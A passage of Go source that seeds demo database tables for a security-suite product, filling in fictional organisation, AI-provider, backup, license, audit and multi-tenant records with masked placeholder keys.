		created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_backup_config (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL UNIQUE,
		enabled BOOLEAN DEFAULT TRUE, schedule_type TEXT DEFAULT 'daily',
		schedule_time TEXT DEFAULT '02:00', retention_days INTEGER DEFAULT 30,
		backup_type TEXT DEFAULT 'full', encrypt BOOLEAN DEFAULT TRUE,
		storage TEXT DEFAULT 'local', s3_bucket TEXT,
		last_run_at TIMESTAMP, next_run_at TIMESTAMP,
		updated_by TEXT, updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_updates (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, version TEXT NOT NULL,
		release_type TEXT DEFAULT 'patch', title TEXT NOT NULL,
		description TEXT, release_notes TEXT, status TEXT DEFAULT 'applied',
		applied_by TEXT, applied_at TIMESTAMP, created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_license (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL UNIQUE,
		license_key TEXT, tier TEXT NOT NULL DEFAULT 'community',
		seats_total INTEGER DEFAULT 5, seats_used INTEGER DEFAULT 0,
		agents_total INTEGER DEFAULT 25, agents_used INTEGER DEFAULT 0,
		features TEXT DEFAULT '[]', valid_from DATE, valid_until DATE,
		issued_to TEXT, issued_by TEXT DEFAULT 'XCloak Security',
		support_tier TEXT DEFAULT 'community', is_trial BOOLEAN DEFAULT FALSE,
		trial_expires_at TIMESTAMP, activated_at TIMESTAMP,
		updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_agents_config (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL UNIQUE,
		offline_threshold_mins INTEGER DEFAULT 15, auto_deregister_days INTEGER DEFAULT 90,
		heartbeat_interval_secs INTEGER DEFAULT 60, max_log_batch INTEGER DEFAULT 1000,
		enable_fim BOOLEAN DEFAULT TRUE, enable_process_monitoring BOOLEAN DEFAULT TRUE,
		enable_network_monitoring BOOLEAN DEFAULT TRUE,
		enrollment_token_ttl_hours INTEGER DEFAULT 48,
		require_signed_binaries BOOLEAN DEFAULT FALSE,
		updated_by TEXT, updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS stte_audit (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action TEXT NOT NULL,
		section TEXT NOT NULL DEFAULT 'general', actor TEXT NOT NULL,
		details TEXT, ip_address TEXT, created_at TIMESTAMP DEFAULT NOW())`)

	// ── Org ───────────────────────────────────────────────────────────────────

	db.Exec(`INSERT INTO stte_org (tenant_id,org_name,display_name,domain,timezone,locale,
		contact_email,support_email,max_agents,data_retention_days,require_mfa,maintenance_mode,updated_by)
		VALUES ($1,'XCloak Security Suite Demo','XCloak Security','corp.example.com','America/New_York','en-US',
		'soc@corp.example.com','support@corp.example.com',10000,365,TRUE,FALSE,'carol.kim')
		ON CONFLICT (tenant_id) DO NOTHING`, tidStr)

	// ── AI Providers ──────────────────────────────────────────────────────────

	type prov struct {
		provider, model, key, endpoint string
		enabled, isDefault             bool
		maxTok                         int
		temp                           float64
		rpm                            int
		budget                         float64
	}
	providers := []prov{
		{"anthropic",   "claude-sonnet-4-6",  "sk-an-****-DEMO", "",                   true,  true,  8192, 0.3, 200, 500},
		{"openai",       "gpt-4o-mini",         "sk-****-DEMO",    "",                   true,  false, 4096, 0.3, 100, 200},
		{"gemini",       "gemini-1.5-pro",      "AIza****DEMO",    "",                   true,  false, 4096, 0.4, 60,  100},
		{"azure_openai", "gpt-4-turbo",         "****DEMO",        "https://corp.openai.azure.com", false, false, 4096, 0.3, 60, 150},
		{"ollama",       "llama3.1:70b",        "",                "http://ollama:11434", false, false, 2048, 0.2, 30,  0},
	}
	for _, p := range providers {
		db.Exec(`INSERT INTO stte_ai_config (tenant_id,provider,model,api_key_masked,endpoint,enabled,is_default,
			max_tokens,temperature,rate_limit_rpm,monthly_budget_usd,updated_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'carol.kim') ON CONFLICT (tenant_id,provider) DO NOTHING`,
			tidStr, p.provider, p.model, exeNullStrSeed(p.key), exeNullStrSeed(p.endpoint),
			p.enabled, p.isDefault, p.maxTok, p.temp, p.rpm, p.budget)
	}

	// ── AI Guardrails ─────────────────────────────────────────────────────────

	db.Exec(`INSERT INTO stte_ai_guardrails (tenant_id,require_approval_for_actions,rbac_enabled,
		data_masking_enabled,hallucination_warnings,audit_all_queries,max_context_length,
		allowed_roles,pii_masking_fields,updated_by)
		VALUES ($1,TRUE,TRUE,TRUE,TRUE,TRUE,16384,
		'["admin","analyst","manager"]',
		'["ssn","credit_card","password","api_key","token"]',
		'carol.kim') ON CONFLICT (tenant_id) DO NOTHING`, tidStr)

	// ── Backup Config ─────────────────────────────────────────────────────────

	db.Exec(`INSERT INTO stte_backup_config (tenant_id,enabled,schedule_type,schedule_time,
		retention_days,backup_type,encrypt,storage,last_run_at,next_run_at,updated_by)
		VALUES ($1,TRUE,'daily','02:00',30,'full',TRUE,'local',$2,$3,'carol.kim')
		ON CONFLICT (tenant_id) DO NOTHING`,
		tidStr, now.Add(-14*time.Hour), now.Add(10*time.Hour))

	// ── Backup Jobs ───────────────────────────────────────────────────────────

	type bkp struct {
		id, btype, status, by string
		size                   int64
		dur, minsAgo           int
	}
	backups := []bkp{
		{"STTE-BKP-001", "full",        "completed", "system",     524288000, 87,  14 * 60},
		{"STTE-BKP-002", "full",        "completed", "system",     518123456, 84,  38 * 60},
		{"STTE-BKP-003", "full",        "completed", "system",     502345678, 91,  62 * 60},
		{"STTE-BKP-004", "full",        "completed", "carol.kim",  496234567, 79,  86 * 60},
		{"STTE-BKP-005", "incremental", "completed", "system",     48234567,  12,  90 * 60},
		{"STTE-BKP-006", "full",        "failed",    "system",     0,         0,   110 * 60},
		{"STTE-BKP-007", "full",        "completed", "system",     488345678, 83,  110 * 60},
		{"STTE-BKP-008", "incremental", "completed", "system",     42123456,  11,  114 * 60},
	}
	for _, b := range backups {
		t := now.Add(-time.Duration(b.minsAgo) * time.Minute)
		var errMsg interface{}
		if b.status == "failed" {
			errMsg = "Storage quota exceeded — freeing space before retry"
		}
		db.Exec(`INSERT INTO stte_backups (tenant_id,backup_id,backup_type,status,size_bytes,duration_secs,triggered_by,error_message,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) ON CONFLICT DO NOTHING`,
			tidStr, b.id, b.btype, b.status, b.size, b.dur, b.by, errMsg, t)
	}

	// ── Updates ───────────────────────────────────────────────────────────────

	type upd struct {
		ver, rtype, title, desc, by string
		minsAgo                      int
	}
	updates := []upd{
		{"2.14.3", "patch", "Bug fixes and performance improvements", "Fixed memory leak in SIEM ingestion pipeline; improved Elasticsearch query performance by 34%", "carol.kim", 720},
		{"2.14.2", "patch", "Security patches", "CVE-2025-1234 patched in authentication middleware; improved session token entropy", "carol.kim", 5040},
		{"2.14.0", "minor", "AI Assistant Enterprise", "Added AI Assistant Enterprise module with 20-section spec; AI chat, investigation, copilot, automation, executive assistant, prompt library, audit trail", "carol.kim", 10080},
		{"2.13.0", "minor", "MDM Enterprise + CMDB Enterprise", "Full Mobile Device Management enterprise module; Complete CMDB with 19-section spec", "carol.kim", 20160},
		{"2.12.0", "minor", "Executive Dashboard + Script Runner", "Executive enterprise dashboard; Script runner with full automation platform", "carol.kim", 30240},
		{"2.10.0", "major", "XCloak Platform v2.10 — Major Release", "Complete platform rewrite: enterprise modules, RBAC, multi-tenant, Kafka event bus, Elasticsearch integration, JWT cookie auth", "carol.kim", 60480},
	}
	for _, u := range updates {
		t := now.Add(-time.Duration(u.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO stte_updates (tenant_id,version,release_type,title,description,status,applied_by,applied_at,created_at)
			VALUES ($1,$2,$3,$4,$5,'applied',$6,$7,$7) ON CONFLICT DO NOTHING`,
			tidStr, u.ver, u.rtype, u.title, u.desc, u.by, t)
	}

	// ── License ───────────────────────────────────────────────────────────────

	features := `["siem","edr","soar","cmdb","mdm","ai_assistant","threat_intel","compliance","executive_reports","api_access","sso","mfa","backup","custom_roles","unlimited_agents","script_runner","quarantine","suppression","vuln_queue","settings_enterprise"]`
	db.Exec(`INSERT INTO stte_license (tenant_id,license_key,tier,seats_total,seats_used,
		agents_total,agents_used,features,valid_from,valid_until,issued_to,
		support_tier,is_trial,activated_at)
		VALUES ($1,'XCLS-DEMO-ENTR-2025-0001','enterprise',250,12,10000,427,$2,
		'2025-01-01','2026-01-01','XCloak Security Suite Demo','enterprise',FALSE,
		'2025-01-01 08:00:00') ON CONFLICT (tenant_id) DO NOTHING`,
		tidStr, features)

	// ── Agents Config ─────────────────────────────────────────────────────────

	db.Exec(`INSERT INTO stte_agents_config (tenant_id,offline_threshold_mins,auto_deregister_days,
		heartbeat_interval_secs,max_log_batch,enable_fim,enable_process_monitoring,
		enable_network_monitoring,enrollment_token_ttl_hours,require_signed_binaries,updated_by)
		VALUES ($1,15,90,60,1000,TRUE,TRUE,TRUE,48,FALSE,'carol.kim')
		ON CONFLICT (tenant_id) DO NOTHING`, tidStr)

	// ── Audit ─────────────────────────────────────────────────────────────────

	type aud struct {
		action, section, actor, details string
		ip                               string
		minsAgo                          int
	}
	audits := []aud{
		{"license_activated",     "system",  "carol.kim",   "key:XCLS-DEMO-ENTR-2025-0001 tier:enterprise", "10.0.1.45", 60480},
		{"org_updated",           "general", "carol.kim",   "Organization settings updated",                 "10.0.1.45", 5040},
		{"ai_config_updated",     "ai",      "carol.kim",   "provider:anthropic",                            "10.0.1.45", 720},
		{"ai_config_updated",     "ai",      "carol.kim",   "provider:openai",                               "10.0.1.45", 719},
		{"backup_triggered",      "system",  "carol.kim",   "backup_id:STTE-BKP-004",                       "10.0.1.45", 86 * 60},
		{"backup_config_updated", "system",  "carol.kim",   "Backup schedule updated",                       "10.0.1.45", 90 * 60},
		{"agents_config_updated", "security","carol.kim",   "Agent configuration updated",                   "10.0.1.45", 10080},
		{"org_updated",           "general", "alice.zhang", "Organization settings updated",                 "10.0.1.22", 4320},
		{"ai_config_updated",     "ai",      "alice.zhang", "provider:gemini",                               "10.0.1.22", 1440},
		{"org_updated",           "general", "carol.kim",   "MFA requirement enabled",                       "10.0.1.45", 2880},
	}
	for _, a := range audits {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO stte_audit (tenant_id,action,section,actor,details,ip_address,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7)`,
			tidStr, a.action, a.section, a.actor, a.details, a.ip, t)
	}

	log.Printf("STTE seed: org, %d AI providers, guardrails, %d backups, %d updates, license, agents_config, %d audit",
		len(providers), len(backups), len(updates), len(audits))
}

// ── Tenants Enterprise Seeder ─────────────────────────────────────────────────

func seedTenantsEnterprise(db *sql.DB) {
	now := time.Now()

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_tenants (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL UNIQUE,
		tenant_name TEXT NOT NULL,
		org_name TEXT NOT NULL,
		domain TEXT,
		status TEXT NOT NULL DEFAULT 'active',
		plan TEXT NOT NULL DEFAULT 'community',
		license_type TEXT NOT NULL DEFAULT 'perpetual',
		primary_admin TEXT,
		admin_email TEXT,
		region TEXT DEFAULT 'us-east-1',
		timezone TEXT DEFAULT 'UTC',
		logo_url TEXT,
		color_theme TEXT DEFAULT '#2563eb',
		custom_domain TEXT,
		language TEXT DEFAULT 'en-US',
		date_format TEXT DEFAULT 'YYYY-MM-DD',
		business_units TEXT DEFAULT '[]',
		departments TEXT DEFAULT '[]',
		notes TEXT,
		trial_ends_at TIMESTAMP,
		contract_start DATE,
		contract_end DATE,
		renewal_date DATE,
		created_at TIMESTAMP DEFAULT NOW(),
		updated_at TIMESTAMP DEFAULT NOW(),
		last_activity_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_modules (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL,
		module TEXT NOT NULL,
		enabled BOOLEAN DEFAULT TRUE,
		enabled_by TEXT,
		enabled_at TIMESTAMP DEFAULT NOW(),
		UNIQUE(tenant_ref, module))`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_resources (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL UNIQUE,
		max_users INTEGER DEFAULT 25,
		max_agents INTEGER DEFAULT 100,
		max_assets INTEGER DEFAULT 5000,
		max_endpoints INTEGER DEFAULT 100,
		max_servers INTEGER DEFAULT 50,
		max_mobile_devices INTEGER DEFAULT 100,
		max_storage_gb INTEGER DEFAULT 500,
		max_api_requests_day INTEGER DEFAULT 100000,
		max_ai_sessions_concurrent INTEGER DEFAULT 10,
		max_reports INTEGER DEFAULT 100,
		max_playbooks INTEGER DEFAULT 200,
		max_integrations INTEGER DEFAULT 20,
		updated_by TEXT,
		updated_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_health (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL,
		check_type TEXT NOT NULL,
		status TEXT NOT NULL DEFAULT 'healthy',
		score INTEGER DEFAULT 100,
		details TEXT,
		checked_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_usage (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL,
		period TEXT NOT NULL,
		active_users INTEGER DEFAULT 0,
		active_agents INTEGER DEFAULT 0,
		daily_log_volume BIGINT DEFAULT 0,
		events_per_second REAL DEFAULT 0,
		api_requests BIGINT DEFAULT 0,
		ai_requests INTEGER DEFAULT 0,
		storage_used_gb REAL DEFAULT 0,
		alerts_count INTEGER DEFAULT 0,
		incidents_count INTEGER DEFAULT 0,
		reports_count INTEGER DEFAULT 0,
		recorded_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_billing (
		id SERIAL PRIMARY KEY,
		tenant_ref TEXT NOT NULL,
		invoice_id TEXT NOT NULL UNIQUE,
		period TEXT NOT NULL,
		amount_usd REAL NOT NULL DEFAULT 0,
		status TEXT NOT NULL DEFAULT 'paid',
		due_date DATE,
		paid_date DATE,
		line_items TEXT DEFAULT '[]',
		created_at TIMESTAMP DEFAULT NOW())`)

	mustExec(db, `CREATE TABLE IF NOT EXISTS tne_audit (
		id SERIAL PRIMARY KEY,
		action TEXT NOT NULL,
		object_type TEXT NOT NULL DEFAULT 'tenant',
		object_id TEXT,
		actor TEXT NOT NULL,
		details TEXT,
		ip_address TEXT,
		created_at TIMESTAMP DEFAULT NOW())`)

	type tenant struct {
		ref, name, org, domain, status, plan, licType string
		admin, email, region, tz, color               string
		cStart, cEnd, renewal                          string
		users, agents, assets, storagGb                int
		eps                                            float64
	}

	tenants := []tenant{
		{"TNE-001", "Acme Corp SOC",     "Acme Corporation",       "acme.example.com",      "active",    "enterprise",      "subscription", "alice.zhang",  "alice@acme.example.com",    "us-east-1",    "America/New_York",   "#2563eb", "2024-01-01", "2026-12-31", "2026-12-01", 48,  847, 12400, 1240, 3250},
		{"TNE-002", "TechStart Inc",     "TechStart Incorporated", "techstart.io",           "active",    "professional",    "subscription", "bob.johnson",  "bob@techstart.io",          "us-west-2",    "America/Los_Angeles","#7c3aed", "2024-06-01", "2026-05-31", "2026-05-01", 22,  312,  4800,  380, 1120},
		{"TNE-003", "FinSecure Ltd",     "FinSecure Limited",      "finsecure.co.uk",        "active",    "enterprise_plus", "subscription", "carol.kim",    "carol@finsecure.co.uk",     "eu-west-1",    "Europe/London",      "#059669", "2023-03-01", "2027-02-28", "2027-02-01", 73,  1240, 18700, 2100, 5840},
		{"TNE-004", "MedGuard Health",   "MedGuard Health Systems","medguard.health",         "trial",     "enterprise",      "trial",        "david.chen",   "david@medguard.health",     "us-east-2",    "America/Chicago",    "#dc2626", "2026-06-18", "2026-09-18", "2026-09-01", 12,   87,  1200,   94,  287},
		{"TNE-005", "GovShield Agency",  "US Federal Agency",      "govshield.gov",           "active",    "enterprise_plus", "perpetual",    "emily.foster", "emily@govshield.gov",       "us-gov-east-1","America/Washington","#b45309", "2022-10-01", "2027-09-30", "2027-09-01", 112, 2840, 34500, 4200, 9340},
		{"TNE-006", "RetailGuard LLC",   "RetailGuard",            "retailguard.com",         "active",    "professional",    "subscription", "frank.miller", "frank@retailguard.com",     "us-west-1",    "America/Denver",     "#0891b2", "2025-01-01", "2026-12-31", "2026-12-01", 18,  147,  2100,  210,  540},
		{"TNE-007", "CloudNative Corp",  "CloudNative Corporation","cloudnative.io",          "suspended", "enterprise",      "subscription", "grace.lee",    "grace@cloudnative.io",      "ap-southeast-1","Asia/Singapore",    "#7c3aed", "2024-03-01", "2026-02-28", "2026-02-01",  8,   34,   400,   28,   72},
		{"TNE-008", "EduSecure Uni",     "State University System","edusecure.edu",            "active",    "community",       "perpetual",    "henry.park",   "henry@edusecure.edu",       "us-east-1",    "America/New_York",   "#2563eb",  "",           "",           "",            5,   12,   240,   18,   34},
		{"TNE-009", "AeroDefense Inc",   "AeroDefense Systems",    "aerodefense.mil",         "active",    "enterprise_plus", "perpetual",    "iris.chen",    "iris@aerodefense.mil",      "us-gov-west-1","America/Los_Angeles","#b45309", "2021-07-01", "2028-06-30", "2028-06-01", 89,  1640, 22100, 3400, 7820},
		{"TNE-010", "StartupSec Co",     "StartupSec",             "startupsec.io",           "active",    "professional",    "subscription", "jack.ryan",    "jack@startupsec.io",        "eu-central-1", "Europe/Berlin",      "#059669", "2026-02-01", "2027-01-31", "2027-01-01",  6,   28,   380,   42,   97},
	}

	modulesByPlan := map[string][]string{
		"community":       {"siem", "edr", "cases", "reports"},
		"professional":    {"siem", "edr", "soar", "cases", "reports", "ai_assistant", "threat_intel"},
		"enterprise":      {"siem", "edr", "soar", "cases", "reports", "ai_assistant", "threat_intel", "vuln_management", "compliance", "cmdb", "mdm", "cloud_security", "script_runner", "quarantine", "suppression"},
		"enterprise_plus": {"siem", "edr", "soar", "cases", "reports", "ai_assistant", "threat_intel", "vuln_management", "compliance", "cmdb", "mdm", "cloud_security", "script_runner", "quarantine", "suppression", "firewall", "container_security", "ot_ics", "executive_ai"},
	}

	planPricing := map[string]float64{
		"community": 0, "professional": 1200, "enterprise": 4500, "enterprise_plus": 9000,
	}

	for i, t := range tenants {
		db.Exec(`INSERT INTO tne_tenants (tenant_ref,tenant_name,org_name,domain,status,plan,license_type,
			primary_admin,admin_email,region,timezone,color_theme,contract_start,contract_end,renewal_date,
			created_at,last_activity_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,NULLIF($13,''),NULLIF($14,''),NULLIF($15,''),
			NOW()-$16::interval,NOW()-$17::interval) ON CONFLICT (tenant_ref) DO NOTHING`,
			t.ref, t.name, t.org, t.domain, t.status, t.plan, t.licType,
			t.admin, t.email, t.region, t.tz, t.color, t.cStart, t.cEnd, t.renewal,
			fmt.Sprintf("%d days", (len(tenants)-i)*30),
			fmt.Sprintf("%d minutes", (i+1)*17))

		// modules
		mods, ok := modulesByPlan[t.plan]
		if !ok {
			mods = modulesByPlan["community"]
		}
		for _, m := range mods {
			db.Exec(`INSERT INTO tne_modules (tenant_ref,module,enabled,enabled_by)
				VALUES ($1,$2,TRUE,$3) ON CONFLICT DO NOTHING`, t.ref, m, t.admin)
		}

		// resources
		db.Exec(`INSERT INTO tne_resources (tenant_ref,max_users,max_agents,max_assets,max_endpoints,
			max_servers,max_mobile_devices,max_storage_gb,max_api_requests_day,
			max_ai_sessions_concurrent,max_reports,max_playbooks,max_integrations,updated_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14) ON CONFLICT (tenant_ref) DO NOTHING`,
			t.ref,
			t.users*2, t.agents*2, t.assets*2,
			t.agents, t.agents/2, t.users*3,
			t.storagGb*2, 200000, 20, 500, 1000, 30, t.admin)

		// current usage
		db.Exec(`INSERT INTO tne_usage (tenant_ref,period,active_users,active_agents,daily_log_volume,
			events_per_second,api_requests,ai_requests,storage_used_gb,alerts_count,incidents_count,reports_count)
			VALUES ($1,'current',$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) ON CONFLICT DO NOTHING`,
			t.ref, t.users, t.agents, int64(t.agents)*50000, t.eps,
			int64(t.agents)*1200, t.users*8, float64(t.storagGb)*0.6,
			t.agents*3, t.agents/10, t.users*4)

		// monthly usage history (6 months)
		for m := 5; m >= 1; m-- {
			period := now.AddDate(0, -m, 0).Format("2006-01")
			growthFactor := 1.0 - float64(m)*0.05
			db.Exec(`INSERT INTO tne_usage (tenant_ref,period,active_users,active_agents,
				daily_log_volume,events_per_second,api_requests,ai_requests,storage_used_gb,recorded_at)
				VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) ON CONFLICT DO NOTHING`,
				t.ref, period,
				int(float64(t.users)*growthFactor),
				int(float64(t.agents)*growthFactor),
				int64(float64(t.agents)*50000*growthFactor),
				t.eps*growthFactor,
				int64(float64(t.agents)*1200*growthFactor),
				int(float64(t.users)*8*growthFactor),
				float64(t.storagGb)*0.6*growthFactor,
				now.AddDate(0, -m, 0))
		}

		// health checks
		checks := []struct {
			ctype  string
			score  int
			status string
			detail string
		}{
			{"agent_connectivity",  92, "healthy",  "97.2% agents connected"},
			{"log_ingestion",       88, "degraded", "Average lag: 4.2s (threshold: 3s)"},
			{"database",            99, "healthy",  "Query latency: 2.1ms p99"},
			{"storage",             78, "degraded", "Utilization: 78% (threshold: 80%)"},
			{"api_performance",     95, "healthy",  "p99 latency: 142ms"},
			{"license_compliance",  100, "healthy", "All limits within bounds"},
		}
		if t.status == "suspended" {
			checks[0].score = 0
			checks[0].status = "critical"
			checks[0].detail = "All agents offline — tenant suspended"
		}
		for _, h := range checks {
			score := h.score + (i%3)*2 - 2
			if score > 100 {
				score = 100
			}
			if score < 0 {
				score = 0
			}
			status := "healthy"
			if score < 70 {
				status = "critical"
			} else if score < 90 {
				status = "degraded"
			}
			db.Exec(`INSERT INTO tne_health (tenant_ref,check_type,status,score,details,checked_at)
				VALUES ($1,$2,$3,$4,$5,NOW()) ON CONFLICT DO NOTHING`,
				t.ref, h.ctype, status, score, h.detail)
		}

		// billing (last 6 months of invoices)
		if t.plan != "community" {
			monthly := planPricing[t.plan]
			for m := 5; m >= 0; m-- {
				mo := now.AddDate(0, -m, 0)
				period := mo.Format("2006-01")
				invoiceID := fmt.Sprintf("INV-%s-%s", t.ref, period)
				status := "paid"
				if m == 0 {
					status = "pending"
				}
				var paidDateVal interface{}
				if status == "paid" {
					paidDateVal = mo.AddDate(0, 0, 5).Format("2006-01-02")
				}
				db.Exec(`INSERT INTO tne_billing (tenant_ref,invoice_id,period,amount_usd,status,
					due_date,paid_date,created_at)
					VALUES ($1,$2,$3,$4,$5,$6,$7,$8) ON CONFLICT (invoice_id) DO NOTHING`,
					t.ref, invoiceID, period, monthly, status,
					mo.AddDate(0, 1, 0).Format("2006-01-02"),
					paidDateVal,
					mo)
			}
		}
	}

	// audit entries
	type audEntry struct {
		action, otype, ref, actor, details, ip string
		minsAgo                                 int
	}
	audits := []audEntry{
		{"tenant_created",        "tenant", "TNE-010", "carol.kim",    "name:StartupSec Co plan:professional",               "10.0.0.1",  2880},
		{"tenant_status_changed", "tenant", "TNE-007", "carol.kim",    "status→suspended",                                   "10.0.0.1",  7200},
		{"module_updated",        "tenant", "TNE-003", "carol.kim",    "module:executive_ai enabled:true",                   "10.0.0.1",   720},
		{"resources_updated",     "tenant", "TNE-002", "alice.zhang",  "Resource limits updated",                            "10.0.0.22", 1440},
		{"tenant_created",        "tenant", "TNE-004", "carol.kim",    "name:MedGuard Health plan:enterprise",               "10.0.0.1",  5040},
		{"tenant_updated",        "tenant", "TNE-001", "carol.kim",    "renewal_date:2026-12-01",                            "10.0.0.1",   360},
		{"module_updated",        "tenant", "TNE-005", "emily.foster", "module:ot_ics enabled:true",                         "10.1.0.5",   480},
		{"resources_updated",     "tenant", "TNE-005", "emily.foster", "max_agents:2840→5000",                               "10.1.0.5",   481},
		{"tenant_status_changed", "tenant", "TNE-004", "carol.kim",    "status:trial trial_ends:2026-09-18",                 "10.0.0.1",  5041},
		{"tenant_created",        "tenant", "TNE-009", "carol.kim",    "name:AeroDefense Inc plan:enterprise_plus",          "10.0.0.1", 14400},
		{"module_updated",        "tenant", "TNE-009", "carol.kim",    "module:firewall enabled:true",                       "10.0.0.1", 14399},
		{"tenant_updated",        "tenant", "TNE-003", "carol.kim",    "plan:enterprise→enterprise_plus",                    "10.0.0.1",  2160},
		{"resources_updated",     "tenant", "TNE-001", "alice.zhang",  "max_users:48→96",                                    "10.0.0.22",  720},
		{"module_updated",        "tenant", "TNE-008", "henry.park",   "module:siem enabled:true",                           "10.2.0.8",  2880},
		{"tenant_created",        "tenant", "TNE-006", "carol.kim",    "name:RetailGuard LLC plan:professional",             "10.0.0.1", 10800},
	}
	for _, a := range audits {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO tne_audit (action,object_type,object_id,actor,details,ip_address,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7)`,
			a.action, a.otype, a.ref, a.actor, a.details, a.ip, t)
	}

	log.Printf("TNE seed: %d tenants with modules, resources, health, usage, billing, %d audit entries", len(tenants), len(audits))
}
